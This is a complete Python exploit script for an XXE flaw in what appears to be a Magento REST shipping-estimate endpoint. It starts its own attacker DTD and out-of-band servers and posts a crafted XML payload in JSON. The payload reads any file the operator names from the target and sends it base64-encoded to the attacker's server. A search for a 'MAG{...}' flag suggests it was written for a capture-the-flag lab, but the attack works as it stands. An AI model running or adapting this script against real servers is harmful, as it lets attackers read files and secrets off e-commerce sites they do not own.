#!/usr/bin/env python3

import argparse
import base64
import os
import re
import socket
import sys
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Constants
ATTACKER_SERVER_PORT = 4242
OOB_SERVER_PORT = 2525
SLEEP_TIME = 5

def get_attacker_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Connect to an external IP address
        s.connect(('8.8.8.8', 80))
        attacker_ip = s.getsockname()[0]
        s.close()
    except Exception:
        attacker_ip = '127.0.0.1'
    return attacker_ip

def serve_dtd_file(port):
    handler = SimpleHTTPRequestHandler
    server_address = ('', port)
    httpd = HTTPServer(server_address, handler)
    logger.info(f"Serving DTD file on port {port}")
    httpd.serve_forever()

def start_oob_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, OOBRequestHandler)
    logger.info(f"OOB server started on port {port}")
    httpd.serve_forever()

class OOBRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            data = base64.b64decode(self.path.split('?')[1]).decode('utf-8')
            decoded_data = base64.b64decode(data).decode('utf-8')
            with open('response_data.txt', 'a') as f:
                f.write(decoded_data + '\n')
            logger.info("Data received and saved.")
        except Exception as e:
            logger.error(f"Error decoding data: {e}")
        self.send_response(200)
        self.end_headers()
    def log_message(self):
        pass

def main():
    parser = argparse.ArgumentParser(description='Exploit script for XXE vulnerability')
    parser.add_argument('--target', '-t', required=True, help='Target URL (http(s)://ip[:port])')
    parser.add_argument('--read-file', '-r', required=True, help='File to read from the remote host')
    parser.add_argument('--oob-server', '-ob', help='OOB server URL (http(s)://ip[:port])')
    parser.add_argument('--host-server', '-hs', help='Host server URL (http(s)://ip[:port])')
    args = parser.parse_args()

    TARGET = args.target.rstrip('/')
    READ_FILE = args.read_file
    OOB_SERVER = args.oob_server
    HOST_SERVER = args.host_server

    # Retrieve attacker's IP address
    attacker_ip = get_attacker_ip()

    # Start OOB server if not provided
    if not OOB_SERVER:
        OOB_SERVER = f"http://{attacker_ip}:{OOB_SERVER_PORT}"
        logger.info(f"No OOB server provided, starting custom OOB server on {OOB_SERVER}")
        oob_server_thread = threading.Thread(target=start_oob_server, args=(OOB_SERVER_PORT,), daemon=True)
        oob_server_thread.start()
        time.sleep(1)

    # Start Host server if not provided
    if not HOST_SERVER:
        HOST_SERVER = f"http://{attacker_ip}:{ATTACKER_SERVER_PORT}"
        logger.info(f"No Host server provided, starting custom Host server on {HOST_SERVER}")
        dtd_server_thread = threading.Thread(target=serve_dtd_file, args=(ATTACKER_SERVER_PORT,), daemon=True)
        dtd_server_thread.start()
        time.sleep(1)

    # Create the DTD file
    with open('dtd.xml', 'w') as f:
        f.write(f'''<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={READ_FILE}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '{OOB_SERVER}/?%data;'>"> 
%param1;''')
    logger.info("DTD file created.")

    # Craft the malicious XML payload
    payload = f'''<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "{HOST_SERVER}/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>'''

    # Create JSON data
    data_json = {
        "address": {
            "totalsReader": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": payload,
                            "options": 16
                        }
                    }
                }
            }
        }
    }

    # Send the request to the target
    logger.info("Sending the request with the specially crafted XML payload.")
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json"
    }
    target_url = f"{TARGET}/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods"

    try:
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        response = requests.post(target_url, headers=headers, json=data_json, verify=False)
        if response.status_code == 200:
            logger.info("Request sent successfully. Waiting for data to be exfiltrated...")
        else:
            logger.error(f"Received response with status code: {response.status_code}")
    except Exception as e:
        logger.error(f"Error sending request: {e}")
        sys.exit(1)

    # Wait for data to be exfiltrated
    time.sleep(SLEEP_TIME)

    # Check if data was received and print flag
    pattern = r"MAG\{[A-Z0-9_]+\}"
    if os.path.isfile("response_data.txt"):
        logger.info("Data exfiltrated successfully. Decoded data saved to response_data.txt.")
        with open('response_data.txt', 'r') as f:
            success_text = f.read()
        flag = re.search(pattern, success_text)
        if flag:
            logger.info(f"Flag found: {flag.group(0)}")
        else:
            logger.warning("No flag found in the received data.")
    else:
        logger.warning("No data received.")

if __name__ == "__main__":
    main()